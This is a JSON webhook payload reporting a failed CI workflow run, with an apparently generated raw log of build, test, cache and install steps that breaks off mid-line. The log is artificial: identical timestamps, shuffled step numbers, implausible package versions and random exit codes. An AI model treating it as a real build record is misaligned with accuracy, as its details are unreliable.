{
  "action": "completed",
  "workflow_run": {
    "id": 15,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-698",
    "head_sha": "a4b453f6d5af22181a466533eb43d27ce55c2cbc",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-04T12:00:17.671226Z",
    "updated_at": "2025-12-04T12:02:41.632905Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:17] INFO: Processing request\n\u2713 build completed\n  PASS: test_api_health (266ms)\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (46MB)\nInstalling jest@4.12.0\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_db_connect (288ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (187ms)\nArtifact uploaded: build.tar.gz (9MB)\nStep 7/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (15MB)\nWARNING: express has known vulnerabilities\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-4960\n[12:00:17] INFO: Processing request\n  PASS: test_api_health (335ms)\n\u2713 build completed\nStep 3/10: Building\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_cache_hit (150ms)\n[12:00:17] ERROR: Connection failed\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/index.js...\n  PASS: test_db_connect (134ms)\nStep 9/10: Building\nStep 9/10: Building\nCache hit for key-2075\n\u2713 test completed\nStep 8/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (7MB)\nInstalling jest@4.20.0\n[12:00:17] INFO: Processing request\n  PASS: test_user_create (73ms)\nStep 4/10: Building\nInstalling express@1.2.0\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-5303\n\u2717 build failed with exit code 13\nInstalling prettier@1.7.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 test completed\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (31MB)\nInstalling jest@5.11.0\nCompiling src/service.java...\nStep 5/10: Building\n[12:00:17] INFO: Processing request\nStep 7/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\n\u2713 test completed\nCompiling src/main.py...\nCache hit for key-7294\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\n  PASS: test_cache_hit (350ms)\nStep 1/10: Building\n[12:00:17] INFO: Processing request\n\u2713 build completed\nCache hit for key-3581\nCompiling src/service.java...\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_cache_hit (390ms)\nInstalling react@3.17.0\nWARNING: jest has known vulnerabilities\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (49MB)\nStep 10/10: Building\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-9173\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 9/10: Building\nStep 10/10: Building\nCache hit for key-6504\nCompiling src/service.java...\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n\u2713 test completed\nCache hit for key-4222\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_api_health (350ms)\nStep 10/10: Building\nCache hit for key-7789\nInstalling jest@3.9.0\nInstalling eslint@2.16.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_user_create (97ms)\nWARNING: lodash has known vulnerabilities\nInstalling lodash@4.8.0\nCompiling src/index.js...\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nCache hit for key-7669\n[12:00:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-1241\n[12:00:17] ERROR: Connection failed\nInstalling express@3.19.0\nCompiling src/index.js...\n\u2713 lint completed\n\u2713 test completed\nCache hit for key-4932\nCompiling src/main.py...\nInstalling axios@3.10.0\n  PASS: test_auth_login (22ms)\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/app.ts...\n[12:00:17] INFO: Processing request\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\nCompiling src/utils.go...\nStep 10/10: Building\nInstalling eslint@3.11.0\nCompiling src/app.ts...\n\u2713 build completed\n  PASS: test_api_health (468ms)\n[12:00:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-5999\nCompiling src/utils.go...\n\u2713 lint completed\n\u2713 build completed\n[12:00:17] INFO: Processing request\n\u2713 lint completed\n[12:00:17] INFO: Processing request\nStep 5/10: Building\n\u2717 build failed with exit code 21\nStep 6/10: Building\nInstalling webpack@3.15.0\nWARNING: prettier has known vulnerabilities\nStep 6/10: Building\nStep 4/10: Building\n  PASS: test_auth_login (455ms)\n\u2713 lint completed\n\u2713 lint completed\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 build completed\nCompiling src/main.py...\nCompiling src/service.java...\n  PASS: test_user_create (498ms)\nCache hit for key-7864\n[12:00:17] INFO: Processing request\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\n\u2713 build completed\n  PASS: test_auth_login (385ms)\n[12:00:17] INFO: Processing request\n  PASS: test_db_connect (486ms)\n\u2713 lint completed\n\u2717 build failed with exit code 66\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: jest has known vulnerabilities\n  PASS: test_auth_login (364ms)\nStep 5/10: Building\nStep 3/10: Building\nInstalling axios@2.18.0\n  PASS: test_db_connect (244ms)\n  PASS: test_api_health (83ms)\n[12:00:17] INFO: Processing request\nStep 9/10: Building\nCache hit for key-2321\n  PASS: test_api_health (411ms)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (28MB)\nStep 10/10: Building\n[12:00:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 test completed\nWARNING: jest has known vulnerabilities\nWARNING: jest has known vulnerabilities\n  PASS: test_db_connect (149ms)\nCache hit for key-8806\nCache hit for key-1682\n  PASS: test_auth_login (189ms)\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-5340\nInstalling jest@5.5.0\nCache hit for key-2638\n  PASS: test_auth_login (403ms)\nInstalling react@5.0.0\nStep 3/10: Building\n[12:00:17] ERROR: Connection failed\n\u2713 build completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (5MB)\n\u2717 build failed with exit code 21\nCache hit for key-4530\n  PASS: test_cache_hit (245ms)\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 lint completed\n[12:00:17] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 lint completed\nStep 2/10: Building\nCache hit for key-9324\nInstalling eslint@3.11.0\n  PASS: test_user_create (187ms)\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling axios@2.4.0\nInstalling jest@2.7.0\n  PASS: test_user_create (236ms)\nInstalling axios@2.16.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-2089\n  PASS: test_db_connect (47ms)\n  PASS: test_auth_login (139ms)\nCompiling src/service.java...\n  PASS: test_cache_hit (144ms)\nStep 5/10: Building\n  PASS: test_db_connect (215ms)\n\u2713 build completed\n\u2713 build completed\nCache hit for key-1787\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:17] WARN: Deprecated API usage\n\u2713 lint completed\n[12:00:17] INFO: Processing request\n\u2713 lint completed\nCache hit for key-6203\n  PASS: test_auth_login (312ms)\nCompiling src/utils.go...\n  PASS: test_auth_login (283ms)\n[12:00:17] INFO: Processing request\nException: NullPointerException\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:17] INFO: Processing request\n\u2717 build failed with exit code 118\n  PASS: test_user_create (315ms)\nCache hit for key-3064\nCache hit for key-2031\n[12:00:17] INFO: Processing request\n\u2717 build failed with exit code 108\n[12:00:17] WARN: Deprecated API usage\nCache hit for key-9890\nCompiling src/app.ts...\n[12:00:17] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_auth_login (21ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (10MB)\nInstalling eslint@5.16.0\nStep 8/10: Building\n[12:00:17] INFO: Processing request\nCache hit for key-8814\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (38MB)\nException: NullPointerException\nCache hit for key-6229\n  PASS: test_user_create (70ms)\nArtifact uploaded: build.tar.gz (7MB)\nInstalling react@5.4.0\n\u2713 build completed\n[12:00:17] WARN: Deprecated API usage\nCompiling src/service.java...\n\u2713 build completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 lint completed\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nInstalling jest@2.9.0\nInstalling axios@5.10.0\nCompiling src/utils.go...\n  PASS: test_db_connect (88ms)\nInstalling lodash@2.19.0\nCompiling src/main.py...\nStep 9/10: Building\n[12:00:17] INFO: Processing request\n\u2713 lint completed\nInstalling axios@3.14.0\n[12:00:17] INFO: Processing request\nStep 7/10: Building\n\u2713 lint completed\nWARNING: webpack has known vulnerabilities\n  PASS: test_db_connect (175ms)\n[12:00:17] WARN: Deprecated API usage\nException: NullPointerException\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\nStep 2/10: Building\n[12:00:17] INFO: Processing request\n\u2713 lint completed\nStep 4/10: Building\nStep 4/10: Building\nCache hit for key-6094\nWARNING: webpack has known vulnerabilities\nStep 9/10: Building\nCompiling src/utils.go...\nStep 4/10: Building\nCache hit for key-8926\nCache hit for key-5701\nStep 5/10: Building\n\u2713 lint completed\n\u2713 test completed\nWARNING: jest has known vulnerabilities\n\u2713 build completed\n[12:00:17] INFO: Processing request\nCache hit for key-2661\nWARNING: prettier has known vulnerabilities\n[12:00:17] INFO: Processing request\nInstalling react@2.11.0\nStep 10/10: Building\nInstalling express@3.6.0\nStep 7/10: Building\nCompiling src/main.py...\n  PASS: test_api_health (476ms)\n  PASS: test_auth_login (206ms)\n[12:00:17] INFO: Processing request\nCache hit for key-6615\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-1425\n  PASS: test_db_connect (72ms)\n[12:00:17] WARN: Deprecated API usage\nCompiling src/app.ts...\n\u2713 build completed\nInstalling lodash@1.15.0\n\u2713 test completed\n[12:00:17] INFO: Processing request\nCache hit for key-2439\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:17] ERROR: Connection failed\n\u2713 build completed\nInstalling react@1.14.0\nCompiling src/service.java...\n\u2713 build completed\n  PASS: test_user_create (412ms)\n[12:00:17] INFO: Processing request\nCache hit for key-9414\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (20MB)\nInstalling prettier@1.19.0\nCache hit for key-1058\n\u2713 test completed\nCache hit for key-5542\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-1739\n  PASS: test_cache_hit (312ms)\n\u2713 build completed\n[12:00:17] WARN: Deprecated API usage\nCompiling src/handler.rs...\n  PASS: test_api_health (255ms)\nInstalling react@1.4.0\n\u2713 lint completed\n  PASS: test_api_health (230ms)\nStep 7/10: Building\nCache hit for key-5415\n\u2713 lint completed\n  PASS: test_auth_login (140ms)\n  PASS: test_cache_hit (401ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nCache hit for key-8639\n[12:00:17] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nInstalling express@5.14.0\n[12:00:17] WARN: Deprecated API usage\nCache hit for key-1983\nCompiling src/handler.rs...\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nCache hit for key-1607\n\u2713 lint completed\nCompiling src/index.js...\nCache hit for key-6616\nStep 7/10: Building\nCache hit for key-5944\nInstalling webpack@2.12.0\nCompiling src/utils.go...\n[12:00:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (4MB)\nStep 7/10: Building\nCache hit for key-8220\n[12:00:17] INFO: Processing request\n[12:00:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:17] INFO: Processing request\nStep 9/10: Building\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (315ms)\nCompiling src/index.js...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_db_connect (7ms)\n\u2713 test completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:17] INFO: Processing request\n  PASS: test_user_create (242ms)\nInstalling lodash@5.18.0\n  PASS: test_api_health (145ms)\nCompiling src/index.js...\nStep 8/10: Building\nStep 10/10: Building\n\u2713 test completed\nStep 2/10: Building\n[12:00:17] INFO: Processing request\nStep 1/10: Building\n\u2713 test completed\n\u2713 build completed\nCompiling src/index.js...\n[12:00:17] ERROR: Connection failed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (50MB)\nInstalling express@1.12.0\nInstalling prettier@1.0.0\nWARNING: express has known vulnerabilities\n[12:00:17] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (1MB)\nStep 3/10: Building\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 9/10: Building\n\u2713 lint completed\n[12:00:17] WARN: Deprecated API usage\nInstalling lodash@2.16.0\n[12:00:17] INFO: Processing request\nInstalling webpack@1.12.0\n  PASS: test_cache_hit (410ms)\nStep 1/10: Building\n\u2713 lint completed\nStep 9/10: Building\nCache hit for key-3042\n\u2717 build failed with exit code 73\n\u2713 lint completed\n\u2713 test completed\nCache hit for key-9881\nInstalling react@3.9.0\n  PASS: test_user_create (453ms)\n  PASS: test_cache_hit (38ms)\nInstalling eslint@2.9.0\nCache hit for key-9132\nStep 2/10: Building\nCache hit for key-8437\n[12:00:17] INFO: Processing request\nCache hit for key-4253\n[12:00:17] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/utils.go...\nCompiling src/main.py...\n\u2713 test completed\nCache hit for key-6555\nCompiling src/handler.rs...\nStep 6/10: Building\n[12:00:17] INFO: Processing request\n\u2713 build completed\nCache hit for key-2855\n  PASS: test_auth_login (86ms)\n\u2713 build completed\nInstalling express@5.7.0\nCache hit for key-7792\n  PASS: test_api_health (284ms)\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:17] INFO: Processing request\nStep 1/10: Building\n  PASS: test_api_health (129ms)\nCache hit for key-6297\n  PASS: test_db_connect (21ms)\n  PASS: test_db_connect (342ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\nCompiling src/main.py...\nCompiling src/utils.go...\nCache hit for key-6035\nArtifact uploaded: build.tar.gz (37MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_db_connect (493ms)\nStep 3/10: Building\n[12:00:17] INFO: Processing request\nStep 5/10: Building\n  PASS: test_db_connect (94ms)\n[12:00:17] INFO: Processing request\n\u2713 test completed\n=== Step type_check completed ===\n=== Step: unit_tests ===\nStep 6/10: Building\n\u2713 build completed\nCompiling src/utils.go...\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_cache_hit (331ms)\n  PASS: test_db_connect (417ms)\nStep 3/10: Building\nCache hit for key-1297\n\u2713 build completed\nStep 6/10: Building\nInstalling express@5.14.0\n[12:00:17] INFO: Processing request\nCache hit for key-7324\nCache hit for key-5994\nStep 3/10: Building\nCompiling src/main.py...\nCache hit for key-8059\nArtifact uploaded: build.tar.gz (23MB)\nStep 7/10: Building\n  PASS: test_user_create (414ms)\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 lint completed\nCompiling src/index.js...\n[12:00:17] INFO: Processing request\nCache hit for key-7952\nCompiling src/handler.rs...\n[12:00:17] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nInstalling express@2.16.0\n\u2713 test completed\nStep 9/10: Building\n  PASS: test_user_create (232ms)\nInstalling express@2.12.0\n[12:00:17] INFO: Processing request\nCache hit for key-6290\nStep 7/10: Building\n  PASS: test_db_connect (257ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-8785\nInstalling jest@1.16.0\n  PASS: test_user_create (359ms)\n  PASS: test_api_health (13ms)\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:17] INFO: Processing request\nException: ValueError\n[12:00:17] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (18MB)\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-1010\nCompiling src/utils.go...\nInstalling webpack@2.19.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-9079\nInstalling jest@4.15.0\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling express@2.10.0\nCompiling src/service.java...\n\u2717 build failed with exit code 74\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-8128\nInstalling react@2.1.0\nCache hit for key-7981\n[12:00:17] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/utils.go...\nCompiling src/handler.rs...\n[12:00:17] INFO: Processing request\nInstalling axios@3.11.0\nCache hit for key-1034\n\u2713 build completed\n[12:00:17] INFO: Processing request\nCache hit for key-1053\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-5924\n[12:00:17] ERROR: Connection failed\n[12:00:17] WARN: Deprecated API usage\nStep 5/10: Building\nCache hit for key-4135\nCache hit for key-2078\nCache hit for key-5176\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (85ms)\n  PASS: test_user_create (275ms)\n[12:00:17] INFO: Processing request\nStep 9/10: Building\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-7218\n  PASS: test_user_create (177ms)\n\u2713 build completed\n  PASS: test_cache_hit (478ms)\nInstalling react@4.16.0\n  PASS: test_api_health (9ms)\nStep 10/10: Building\n\u2713 test completed\nCompiling src/handler.rs...\nCompiling src/app.ts...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-7564\n[12:00:17] INFO: Processing request\nStep 3/10: Building\nInstalling webpack@4.11.0\n[12:00:17] INFO: Processing request\nInstalling eslint@5.4.0\nInstalling jest@3.19.0\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:17] ERROR: Connection failed\n  PASS: test_api_health (448ms)\n  PASS: test_api_health (226ms)\n[12:00:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_db_connect (426ms)\n  PASS: test_auth_login (3ms)\nCache hit for key-2216\n  PASS: test_cache_hit (177ms)\nInstalling eslint@1.16.0\n[12:00:17] INFO: Processing request\nStep 1/10: Building\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nCompiling src/index.js...\n[12:00:17] INFO: Processing request\nCache hit for key-7828\n[12:00:17] INFO: Processing request\nStep 9/10: Building\n[12:00:17] WARN: Deprecated API usage\nStep 5/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/handler.rs...\nCache hit for key-5713\nStep 9/10: Building\nCache hit for key-4883\nInstalling prettier@4.4.0\n\u2713 build completed\n\u2713 build completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-3690\nCompiling src/index.js...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-9728\n[12:00:17] INFO: Processing request\nCache hit for key-7637\nArtifact uploaded: build.tar.gz (22MB)\nInstalling webpack@4.16.0\n[12:00:17] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_cache_hit (100ms)\nStep 5/10: Building\nInstalling webpack@1.9.0\nCache hit for key-6707\n  PASS: test_user_create (290ms)\n\u2713 build completed\n[12:00:17] WARN: Deprecated API usage\nCache hit for key-3216\nInstalling react@5.2.0\n=== Step unit_tests completed ===\n=== Step: build ===\n[12:00:17] INFO: Processing request\nInstalling lodash@2.15.0\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_api_health (340ms)\nInstalling axios@2.6.0\nCache hit for key-7215\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 build completed\n  PASS: test_db_connect (171ms)\n[12:00:17] WARN: Deprecated API usage\nCache hit for key-5921\n  PASS: test_user_create (381ms)\nStep 4/10: Building\nInstalling webpack@1.16.0\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-8830\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_cache_hit (244ms)\nStep 5/10: Building\n  PASS: test_api_health (43ms)\nStep 3/10: Building\n[12:00:17] INFO: Processing request\nCache hit for key-5685\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_db_connect (35ms)\nFAILED: test_user_create\nInstalling prettier@4.19.0\n\u2713 lint completed\nInstalling jest@5.8.0\n\u2713 build completed\n  PASS: test_api_health (48ms)\nCache hit for key-4637\n\u2713 build completed\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-6823\n  PASS: test_db_connect (454ms)\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-2155\n\u2717 build failed with exit code 51\n[12:00:17] INFO: Processing request\n  PASS: test_cache_hit (178ms)\n  PASS: test_auth_login (382ms)\n\u2713 test completed\nCompiling src/main.py...\n\u2713 lint completed\n  PASS: test_user_create (148ms)\nStep 8/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-3209\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:17] INFO: Processing request\nInstalling react@4.2.0\nStep 2/10: Building\n  PASS: test_db_connect (496ms)\n\u2713 lint completed\nException: NullPointerException\nCache hit for key-3054\nCompiling src/handler.rs...\n[12:00:17] INFO: Processing request\nStep 6/10: Building\nStep 5/10: Building\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_auth_login (9ms)\n[12:00:17] INFO: Processing request\nInstalling express@1.16.0\nCompiling src/main.py...\n  PASS: test_cache_hit (364ms)\nInstalling react@5.12.0\nInstalling react@5.3.0\nStep 7/10: Building\nStep 3/10: Building\n  PASS: test_auth_login (40ms)\nCache hit for key-7392\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nInstalling react@2.18.0\n[12:00:17] WARN: Deprecated API usage\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:17] INFO: Processing request\n\u2713 test completed\nCompiling src/main.py...\n[12:00:17] ERROR: Connection failed\nCache hit for key-6507\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-2445\n  PASS: test_cache_hit (310ms)\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nInstalling express@2.13.0\n[12:00:17] WARN: Deprecated API usage\nCache hit for key-4161\nArtifact uploaded: build.tar.gz (37MB)\nStep 7/10: Building\nCompiling src/handler.rs...\n[12:00:17] INFO: Processing request\n\u2713 test completed\nFAILED: test_cache_hit\nCompiling src/service.java...\nStep 3/10: Building\n  PASS: test_api_health (147ms)\nCache hit for key-4114\n[12:00:17] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-5503\n\u2713 lint completed\nCache hit for key-7689\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:17] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\n  PASS: test_user_create (447ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-4889\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-4787\nStep 5/10: Building\n  PASS: test_user_create (331ms)\n[12:00:17] WARN: Deprecated API usage\n\u2713 build completed\n\u2713 build completed\n[12:00:17] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nStep 1/10: Building\nStep 10/10: Building\n  PASS: test_api_health (400ms)\n  PASS: test_api_health (490ms)\n\u2713 test completed\n[12:00:17] INFO: Processing request\nCache hit for key-1246\nInstalling eslint@1.16.0\nWARNING: lodash has known vulnerabilities\nStep 1/10: Building\nStep 6/10: Building\nCompiling src/main.py...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:17] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-5675\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 test completed\nStep 9/10: Building\n[12:00:17] WARN: Deprecated API usage\n[12:00:17] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\n=== Step build completed ===\n=== Step: setup_environment ===\nCache hit for key-2105\nCache hit for key-4037\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 test completed\nCache hit for key-2414\nCompiling src/app.ts...\nCache hit for key-4759\nStep 7/10: Building\n[12:00:17] INFO: Processing request\nCache hit for key-3282\n[12:00:17] INFO: Processing request\nCache hit for key-1363\nFAILED: test_cache_hit\n[12:00:17] INFO: Processing request\nCache hit for key-7277\nInstalling lodash@3.6.0\n[12:00:17] INFO: Processing request\nCompiling src/index.js...\nStep 1/10: Building\nCache hit for key-7426\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 test completed\n[12:00:17] INFO: Processing request\nCompiling src/service.java...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (41MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\n\u2713 lint completed\nCompiling src/main.py...\nInstalling express@3.14.0\nCompiling src/handler.rs...\n  PASS: test_db_connect (20ms)\nArtifact uploaded: build.tar.gz (5MB)\nStep 10/10: Building\nCache hit for key-6311\nInstalling axios@3.0.0\n  PASS: test_cache_hit (446ms)\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_user_create (139ms)\nCache hit for key-7517\nArtifact uploaded: build.tar.gz (39MB)\nInstalling jest@1.5.0\nCompiling src/utils.go...\nInstalling axios@2.10.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling prettier@5.18.0\nCache hit for key-1244\n[12:00:17] INFO: Processing request\nStep 3/10: Building\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:17] INFO: Processing request\nCache hit for key-2970\nStep 2/10: Building\nCache hit for key-1018\nInstalling lodash@3.4.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/service.java...\n[12:00:17] INFO: Processing request\n[12:00:17] ERROR: Connection failed\nStep 4/10: Building\nStep 6/10: Building\n  PASS: test_cache_hit (108ms)\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:17] INFO: Processing request\nCache hit for key-7442\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/utils.go...\n  PASS: test_cache_hit (172ms)\nWARNING: webpack has known vulnerabilities\n[12:00:17] INFO: Processing request\n\u2713 test completed\n  PASS: test_api_health (341ms)\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_cache_hit (190ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 build completed\nStep 1/10: Building\nInstalling webpack@5.8.0\nStep 2/10: Building\nStep 6/10: Building\nInstalling eslint@4.13.0\n  PASS: test_auth_login (464ms)\nInstalling axios@5.7.0\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nCache hit for key-2359\n  PASS: test_db_connect (330ms)\n[12:00:17] INFO: Processing request\nStep 7/10: Building\nInstalling lodash@5.16.0\n  PASS: test_db_connect (185ms)\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing 